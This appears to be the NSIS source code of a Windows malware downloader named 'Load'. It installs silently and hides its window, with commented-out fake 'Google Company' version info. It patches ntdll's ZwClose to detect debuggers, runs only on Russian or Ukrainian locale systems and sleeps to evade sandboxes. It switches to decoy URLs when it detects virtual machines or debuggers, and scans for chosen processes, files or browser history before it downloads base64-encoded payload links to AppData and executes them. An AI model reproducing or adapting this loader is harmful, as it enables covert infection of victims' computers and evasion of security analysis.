
Name "Load"

OutFile "load.exe"

RequestExecutionLevel user
SilentInstall silent
ShowInstDetails show
CRCCheck off

SetCompressor /SOLID lzma

!include "LogicLib.nsh"
!include "FileFunc.nsh"
!include "WordFunc.nsh"

!include "headers\recvfind.nsh"
!include "headers\findproc.nsh"
!include "settings.nsh"
!include "headers\findtrap.nsh"

!include "headers\chartoascii.nsh"
!include "headers\base64.nsh"

!include "headers\iehistory.nsh"

;LoadLanguageFile "${NSISDIR}\Contrib\Language files\English.nlf"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "CompanyName" "Google"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "FileDescription" "Google Company"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "FileVersion" "4.4.5"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "InternalName" ""
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "LegalCopyright" "Copyright Google Company"
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "OriginalFilename" ""
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "PrivateBuild" ""
;  VIAddVersionKey /LANG=${LANG_ENGLISH} "ProductName" ""
;  VIProductVersion "4.0.5.2712"

!define SWP_NOSIZE	  0x0001
!define SWP_NOOWNERZORDER 0x0200

!define PAGE_EXECUTE_READWRITE 0x40

!define SW_HIDE 0x0
!define SW_SHOWNORMAL 1

;Function ".onInit" ; Payload
;  SetOutPath "$TEMP"
;  File "license.txt"
;FunctionEnd

!if ${DEBUG_MODE} != true
  AutoCloseWindow true
  Function ".onGUIInit"
  System::Call "User32::SetWindowPos(i, i, i, i, i, i, i) b ($HWNDPARENT, 0, -10000, -10000, 0, 0, ${SWP_NOOWNERZORDER}|${SWP_NOSIZE})"
  FunctionEnd
!endif

Function SplitArgs
Exch $0
Push $1
Push $3
Push $4
StrCpy $1 0
StrCpy $3 0
loop:
    StrCpy $4 $0 1 $3
    ${If} $4 == '"'
	${If} $1 <> 0 
	    StrCpy $0 $0 "" 1
	    IntOp $3 $3 - 1
	${EndIf}
	IntOp $1 $1 !
    ${EndIf}
    ${If} $4 == ''
	StrCpy $1 0
	StrCpy $4 ' '
    ${EndIf} 
    ${If} $4 == ' '
    ${AndIf} $1 = 0
	StrCpy $4 $0 $3
	StrCpy $1 $4 "" -1
	${IfThen} $1 == '"' ${|} StrCpy $4 $4 -1 ${|}
	killspace:
	    IntOp $3 $3 + 1
	    StrCpy $0 $0 "" $3
	    StrCpy $1 $0 1
	    StrCpy $3 0
	    StrCmp $1 ' ' killspace
	Push $0
	Exch 4
	Pop $0
	StrCmp $4 "" 0 moreleft
	    Pop $4
	    Pop $3
	    Pop $1
	    Return
	moreleft:
	Exch $4
	Exch 2
	Pop $1
	Pop $3
	Return
    ${EndIf}
    IntOp $3 $3 + 1
    Goto loop
FunctionEnd

Function ScanFiles
Exch $0
Exch
Exch $1
Push $2
push $3
push $4
push $5
StrCpy $2 $1
StrCpy $9 $0
${WordFind} "$2" "%APPDATA%" "#" $0
${If} $0 != $2
    ${WordReplace} "$2" "%APPDATA%" $APPDATA "+" $2
${Else}
    ${WordFind} "$2" "%COMMONFILES32%" "#" $0
    ${If} $0 != $2
	${WordReplace} "$2" "%COMMONFILES32%" $COMMONFILES32 "+" $2
    ${Else}
	${WordFind} "$2" "%COMMONFILES64%" "#" $0
	${If} $0 != $2
	    ${WordReplace} "$2" "%COMMONFILES64%" $COMMONFILES64 "+" $2
	${Else}
	    ${WordFind} "$2" "%DESKTOP%" "#" $0
	    ${If} $0 != $2
		${WordReplace} "$2" "%DESKTOP%" $DESKTOP "+" $2
	    ${Else}
		${WordFind} "$2" "%DOCUMENTS%" "#" $0
		${If} $0 != $2
		    ${WordReplace} "$2" "%DOCUMENTS%" $DOCUMENTS "+" $2
		${Else}
		    ${WordFind} "$2" "%LOCALAPPDATA%" "#" $0
		    ${If} $0 != $2
			${WordReplace} "$2" "%LOCALAPPDATA%" $LOCALAPPDATA "+" $2
		    ${Else}
			${WordFind} "$2" "%PROFILE%" "#" $0
			${If} $0 != $2
			    ${WordReplace} "$2" "%PROFILE%" $PROFILE "+" $2
			${Else}
			    ${WordFind} "$2" "%PROGRAMFILES32%" "#" $0
			    ${If} $0 != $2
				${WordReplace} "$2" "%PROGRAMFILES32%" $PROGRAMFILES32 "+" $2
			    ${Else}
				${WordFind} "$2" "%PROGRAMFILES64%" "#" $0
				${If} $0 != $2
				    ${WordReplace} "$2" "%PROGRAMFILES64%" $PROGRAMFILES64 "+" $2
				${EndIf}
			    ${EndIf}
			${EndIf}
		    ${EndIf}
		${EndIf}
	    ${EndIf}
	${EndIf}
    ${EndIf}
${EndIf}
StrCpy $6 ""
${WordFind} "$2" "[" "#" $0
${If} $0 != $2
    ${WordReplace} "$2" "[" "" "+" $2
    ${WordReplace} "$2" "]" "" "+" $2
    FindFirst $0 $4 "$2\*.*"
    loop:
	StrCmp $4 "" find_done
	StrCpy $3 ""
	!if ${DEBUG_MODE} == true
	  DetailPrint "File: $2\$4"
	!endif
	call CheckWord
	StrCmp $5 "Done" find_done
	FindNext $0 $4
	Goto loop
    find_done:
    FindClose $0
${Else}
    !if ${DEBUG_MODE} == true
      DetailPrint "$2"
    !endif
    ${RecFindOpen} $2 $3 $4
    !if ${DEBUG_MODE} == true
      DetailPrint "Directory: $3"
    !endif
    call CheckWord
    StrCmp $5 "Done" recv_find_done
    ${RecFindFirst}
    !if ${DEBUG_MODE} == true
      DetailPrint "File: $3\$4"
    !endif
    call CheckWord
    StrCmp $5 "Done" recv_find_done
    System::Call "Kernel32::SleepEx(i, i) b (${DELAY}, 0x0)"
    ${RecFindNext}
    recv_find_done:
    ${RecFindClose}
${EndIf}
pop $5
pop $4
pop $3
Pop $2
Pop $1
Pop $0
push $6
FunctionEnd

Function CheckWord
push $9
push $9
    loop:
	call SplitArgs
	Pop $5
	${If} $5 == ""
	    StrCpy $5 ""
	    Goto nextname
	${EndIf}
	    ${WordFind} $5 "\" "#" $7
	    ${If} $5 == $7
		${WordFind} $5 "*" "#" $7
		${If} $5 != $7
		    ${WordReplace} $5 "*" "" "+" $9
		    ${WordFind} $4 $9 "#" $7
		    ${If} $4 != $7
			!if ${DEBUG_MODE} == true
			  DetailPrint 'Stop on file: $2$3\$4 (By floating tag: "$5")'
			!endif
			call DownloadAndExec
			goto done
		    ${EndIf}
		    ${WordFind} $3 $9 "#" $7
		    ${If} $3 != $7
			!if ${DEBUG_MODE} == true
			  DetailPrint 'Stop on directory: $2$3 (By floating tag: "$5")'
			!endif
			call DownloadAndExec
			goto done
		    ${EndIf}
		${Else}
		    ${If} $4 == $5
			!if ${DEBUG_MODE} == true
			  DetailPrint 'Stop on file: $2$3\$4 (By fixed tag: "$5")'
			!endif
			call DownloadAndExec
			goto done
		    ${EndIf}
		    ${WordFind} $3 "\" "-1" $7
		    ${If} $7 == $5
			!if ${DEBUG_MODE} == true
			  DetailPrint 'Stop on directory: $2$3 (By fixed tag: "$5")'
			!endif
			call DownloadAndExec
			goto done
		    ${EndIf}
		${EndIf}
	    ${Else}
		StrCpy $9 $5
		${WordFind} "$9" "%APPDATA%" "#" $7
		${If} $7 != $9
		    ${WordReplace} "$9" "%APPDATA%" $APPDATA "+" $9
		${Else}
		    ${WordFind} "$9" "%COMMONFILES32%" "#" $7
		    ${If} $7 != $9
			${WordReplace} "$9" "%COMMONFILES32%" $COMMONFILES32 "+" $9
		    ${Else}
			${WordFind} "$9" "%COMMONFILES64%" "#" $7
			${If} $7 != $9
			    ${WordReplace} "$9" "%COMMONFILES64%" $COMMONFILES64 "+" $9
			${Else}
			    ${WordFind} "$9" "%DESKTOP%" "#" $7
			    ${If} $7 != $9
				${WordReplace} "$9" "%DESKTOP%" $DESKTOP "+" $9
			    ${Else}
				${WordFind} "$9" "%DOCUMENTS%" "#" $7
				${If} $7 != $9
				    ${WordReplace} "$9" "%DOCUMENTS%" $DOCUMENTS "+" $9
				${Else}
				    ${WordFind} "$9" "%LOCALAPPDATA%" "#" $7
				    ${If} $7 != $9
					${WordReplace} "$9" "%LOCALAPPDATA%" $LOCALAPPDATA "+" $9
				    ${Else}
					${WordFind} "$9" "%PROFILE%" "#" $7
					${If} $7 != $9
					    ${WordReplace} "$9" "%PROFILE%" $PROFILE "+" $9
					${Else}
					    ${WordFind} "$9" "%PROGRAMFILES32%" "#" $7
					    ${If} $7 != $9
						${WordReplace} "$9" "%PROGRAMFILES32%" $PROGRAMFILES32 "+" $9
					    ${Else}
						${WordFind} "$9" "%PROGRAMFILES64%" "#" $7
						${If} $7 != $9
						    ${WordReplace} "$9" "%PROGRAMFILES64%" $PROGRAMFILES64 "+" $9
						${EndIf}
					    ${EndIf}
					${EndIf}
				    ${EndIf}
				${EndIf}
			    ${EndIf}
			${EndIf}
		    ${EndIf}
		${EndIf}
		push $2
		push $3
		${WordFind} $9 "\" "*" $7
		${If} $9 != $7
		    ${WordFind} $9 "\" "-1" $5
		    ${If} $3 != ""
			${WordFind} "$2$3" "\" "*" $8
			${If} "$2$3" != $8
			    ${If} $7 == $8
				${WordFind} $5 "*" "#" $7
				${If} $5 != $7
				    ${WordReplace} $5 "*" "" "+" $8
				    ${WordFind} $3 $8 "#" $7
				    ${If} $3 != $7
					!if ${DEBUG_MODE} == true
					  DetailPrint 'Stop on directory: $2$3 (By floating tag: "$9")'
					!endif
					call DownloadAndExec
					pop $3
					pop $2
					goto done
				    ${EndIf}
				${Else}
				    ${WordFind} $3 "\" "-1" $7
				    ${If} $7 == $5
					!if ${DEBUG_MODE} == true
					  DetailPrint 'Stop on directory: $2$3 (By fixed tag: "$9")'
					!endif
					call DownloadAndExec
					pop $3
					pop $2
					goto done
				    ${EndIf}
				${EndIf}
			    ${EndIf}
			${EndIf}
		    ${EndIf}
		    ${If} $3 == ""
			${If} $4 != ""
			    ${WordFind} "$2\$4" "\" "*" $8
			    ${If} "$2\$4" != $8
				${If} $7 == $8
				    ${WordFind} $5 "*" "#" $7
				    ${If} $5 != $7
					${WordReplace} $5 "*" "" "+" $8
					${WordFind} $4 $8 "#" $7
					${If} $4 != $7
					    !if ${DEBUG_MODE} == true
					      DetailPrint 'Stop on file: $2\$4 (By floating tag: "$9")'
					    !endif
					    call DownloadAndExec
					    pop $3
					    pop $2
					    goto done
					${EndIf}
				    ${Else}
					${WordFind} $4 "\" "-1" $7
					${If} $7 == $5
					    !if ${DEBUG_MODE} == true
					      DetailPrint 'Stop on file: $2\$4 (By fixed tag: "$9")'
					    !endif
					     call DownloadAndExec
					     pop $3
					     pop $2
					     goto done
					${EndIf}
				    ${EndIf}
				${EndIf}
			    ${EndIf}
			${EndIf}
		    ${EndIf}
		    ${If} $3 != ""
			${If} $4 != ""
			    ${WordFind} "$2$3\$4" "\" "*" $8
			    ${If} "$2$3\$4" != $8
				${If} $7 == $8
				    ${WordFind} $5 "*" "#" $7
				    ${If} $5 != $7
					${WordReplace} $5 "*" "" "+" $8
					${WordFind} $4 $8 "#" $7
					${If} $4 != $7
					    !if ${DEBUG_MODE} == true
					      DetailPrint 'AStop on file: $2$3\$4 (By floating tag: "$9")'
					    !endif
					    call DownloadAndExec
					    pop $3
					    pop $2
					    goto done
					${EndIf}
				    ${Else}
					${WordFind} $4 "\" "-1" $7
					${If} $7 == $5
					    !if ${DEBUG_MODE} == true
					      DetailPrint 'BStop on file: $2$3\$4 (By fixed tag: "$9")'
					    !endif
					     call DownloadAndExec
					     pop $3
					     pop $2
					     goto done
					${EndIf}
				    ${EndIf}
				${EndIf}
			    ${EndIf}
			${EndIf}
		    ${EndIf}
		${EndIf}
		pop $3
		pop $2
	    ${EndIf}
    Goto loop
done:
StrCpy $5 "Done"
nextname:
pop $9
FunctionEnd

Function DownloadAndExec
push $9
${Base64_Decode} ${LINK}
nextlink:
    call SplitArgs
    Pop $7
    ${If} $7 == ""
	StrCpy $6 "Stop"
	goto done
    ${EndIf}
    !if ${DEBUG_MODE} == true
      DetailPrint "$7"
    !endif
    StrCpy $9 0
download_loop:
    Delete $APPDATA\1.CAB
    NSISdl::download $7 $APPDATA\1.CAB
    Pop $0
    ${If} $0 == "success"
	IfFileExists $APPDATA\1.CAB execute
    ${EndIf}
    System::Call "Kernel32::Sleep(i) b (1000)"
    IntOp $9 $9 + 1
    StrCmp $9 10 nextlink download_loop
execute:
    ;nsExec::Exec 'CMD.EXE /c copy /y "$APPDATA\1.CAB" *.exe'
    ;nsExec::Exec 'CMD.EXE /c 1.exe'
    System::Alloc 72
    Pop $2
    System::Call "*$2(i72,i,i,i,i,i,i,i,i,i,i,i)"
    System::Call "*(i,i,i,i)i.r3"
    System::Call 'kernel32::CreateProcess(t"$APPDATA\1.CAB",i0,i0,i0,i0,i0x20,i0,i0,ir2,ir3)i.r4'
       System::Call "*$3(i.r1)"
       System::Call "kernel32::WaitForSingleObject(ir1, i-1)"
    System::Call "kernel32::CloseHandle(ir4)"
    System::Free $2
    System::Free $3
Goto nextlink
done:
pop $9
FunctionEnd

!if ${IF_TRAP_FOUND} == use_fake_url

Function FAKE_DownloadAndExec
push $9
${Base64_Decode} ${FAKE_LINK}
nextlink:
    call SplitArgs
    Pop $7
    ${If} $7 == ""
	StrCpy $6 "Stop"
	goto done
    ${EndIf}
    !if ${DEBUG_MODE} == true
      DetailPrint "$7"
    !endif
    StrCpy $9 0
download_loop:
    Delete $APPDATA\1.CAB
    NSISdl::download $7 $APPDATA\1.CAB
    Pop $0
    ${If} $0 == "success"
	IfFileExists $APPDATA\1.CAB execute
    ${EndIf}
    System::Call "Kernel32::Sleep(i) b (1000)"
    IntOp $9 $9 + 1
    StrCmp $9 10 nextlink download_loop
execute:
    ;nsExec::Exec 'CMD.EXE /c copy /y "$APPDATA\1.CAB" *.exe'
    ;nsExec::Exec 'CMD.EXE /c 1.exe'
    System::Alloc 72
    Pop $2
    System::Call "*$2(i72,i,i,i,i,i,i,i,i,i,i,i)"
    System::Call "*(i,i,i,i)i.r3"
    System::Call 'kernel32::CreateProcess(t"$APPDATA\1.CAB",i0,i0,i0,i0,i0x20,i0,i0,ir2,ir3)i.r4'
       System::Call "*$3(i.r1)"
       System::Call "kernel32::WaitForSingleObject(ir1, i-1)"
    System::Call "kernel32::CloseHandle(ir4)"
    System::Free $2
    System::Free $3
Goto nextlink
done:
pop $9
FunctionEnd

!endif

;Function ScanDrives
;push $9
;push ${WORD}
;call ScanFiles
;pop $0
;${If} $0 == "Stop"
;    push "StopGetDrives"
;${Else}
;    push $0
;${EndIf}
;FunctionEnd

Section

SectionEnd

Section

SectionEnd

Section

!if ${DEBUG_MODE} != true
    HideWindow
!endif

System::Call "kernel32::GetModuleHandle(t 'ntdll.dll') p .r0"
System::Call "kernel32::GetProcAddress(p r0, t 'ZwClose') p .r2"
System::Call "kernel32::VirtualProtectEx(i 0xFFFFFFFF, p r2, i 0x6, i ${PAGE_EXECUTE_READWRITE}, *i .r1) p .r0"
System::Alloc 6
pop $3
System::Call "ntdll::memcpy(p r3, p r2, i 6)"
System::Call "ntdll::memcpy(p r2, t '1ÀYZÿá', i 6)"
System::Call "kernel32::CloseHandle(i 0x12345678) p .r4"
System::Call "ntdll::memcpy(p r2, p r3, i 6)"
System::Free $3

;System::Call "kernel32::VirtualProtect(p r2, i 0x1000, i r1, *i r1) p .r0"

${If} $4 = 1
    System::Call 'kernel32::GetSystemDefaultLangID()i.r0'
    IntOp $LANGUAGE $0 & 0xFFFF
    ${If} $LANGUAGE = 1058 ; UA
	Goto Start
    ${EndIf}
    ${If} $LANGUAGE = 1049 ; RU
	start:
	System::Call "Kernel32::Sleep(i) b (15000)"
        call FindTrap
	pop $0
	${If} $0 = 0
	    !if ${DEBUG_MODE} == true
	        MessageBox MB_OK "DETECTOR: Debuggers and virtual machines not detected! Loader started in [NORMAL] mode."
	    !endif
	    ${Base64_Decode} ${PROCESSES_LIST}
	    Pop $9
	    ${FindProcess} $9 $0
	    ${If} $0 != 0
		call DownloadAndExec
	    ${Else}
	        StrCpy $0 1
		nextargs:
		${Base64_Decode} ${PATH}
		Pop $9
		StrCpy $3 $0
		${WordFind2X} $9 "{" "}" "+$3" $1
		${If} $9 == $1
		    call ScanIeHistory
	    	    goto leave
		${EndIf}
		${Base64_Decode} ${WORD}
		Pop $9
		${WordFind2X} $9 "{" "}" "+$3" $2
		${If} $9 == $2
		    call ScanIeHistory
	    	    goto leave
		${EndIf}
	    	push $0
	    	push $2
	    	push $1
	    	loop_:
		call SplitArgs
		Pop $0
		${If} $0 == ""
		    pop $2
		    pop $0
		    IntOp $0 $0 + 1
		    goto nextargs
		${EndIf}
		push $0
		push $2
		call ScanFiles
		pop $0
		${If} $0 == "Stop"
		    pop $2
		    pop $0
		    Goto leave
		${EndIf}
	        Goto loop_
            ${EndIf}
	${Else}
	    !if ${DEBUG_MODE} == true
		!if ${IF_TRAP_FOUND} == just_exit
		    MessageBox MB_OK "DETECTOR: Debugger or virtual machine is detected! Loader [STOPPED]."
		!endif
		!if ${IF_TRAP_FOUND} == use_fake_url
		    MessageBox MB_OK "DETECTOR: Debugger or virtual machine is detected! Loader started in [FAKE] mode."
		!endif
	    !endif
	    !if ${IF_TRAP_FOUND} == use_fake_url
		call FAKE_DownloadAndExec
	    !endif
            leave:
        ${EndIf}
    ${EndIf}
${EndIf}
SectionEnd
